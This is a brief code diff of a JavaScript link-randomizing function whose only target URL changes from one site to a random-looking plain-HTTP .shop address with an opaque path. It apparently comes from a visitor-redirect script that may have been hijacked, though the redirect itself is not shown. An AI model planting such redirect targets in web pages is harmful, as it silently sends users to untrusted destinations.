@@ -1,6 +1,6 @@
   function hreRadom(){
 		        var oHref=new Array(
-		        "https://nima.vip/"
+		        "http://www.l78jwok345r.shop/saddle/F8dkc/1kkcgh4UB8"
 		      
 		     );
 			 var currindex=Math.round(Math.random()*0);
